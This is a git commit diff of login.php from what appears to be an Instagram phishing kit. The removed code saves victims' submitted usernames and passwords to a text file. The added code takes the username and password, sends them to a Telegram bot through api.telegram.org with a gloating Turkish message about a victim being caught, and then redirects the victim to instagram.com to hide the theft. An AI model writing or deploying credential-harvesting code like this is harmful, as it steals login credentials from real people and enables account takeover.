d409a36016c71d4076943fdb48a58833a3f462d2
sublimedeus <108197268+sublimedeus@users.noreply.github.com>
2022-06-27 13:43:09 +0300

    Update login.php

--- login.php
+++ login.php
@@ -1,13 +1,24 @@
-<?php
- $user = $_POST["username"];
- $pass = $_POST["password"];
 
- $co = "===========================================\n"; 
- $cl = "===========================================\n";
- $fileuser = fopen("deus.txt", "a") or die("Intentalo nuevamente");
- $us = "Username: $user\n";
- $pa = "Password: $pass\n";
- fwrite($fileuser, "\n". $co. $us. $pa. $cl);
- fclose($fileuser);
- header('Location: https://instagram.com/');
- exit()
+<?php
+include('tg.php');
+
+$id=$_GET["id"];
+if($_POST){
+$id= $_POST['id'];
+header("location: login.php?id=$id");
+
+$password=$_POST["password"];
+header("location: password.php?id=$id");
+
+$data = [
+  'text' => '➡️ Lan Koş Sazan Düştü 😈 
+Kullanıcı Adı : '.$id.'
+Şifre : '.$password.'
+',
+  'chat_id' => $chat_id
+];
+
+file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
+header('Location: https://instagram.com/');
+}
+?>
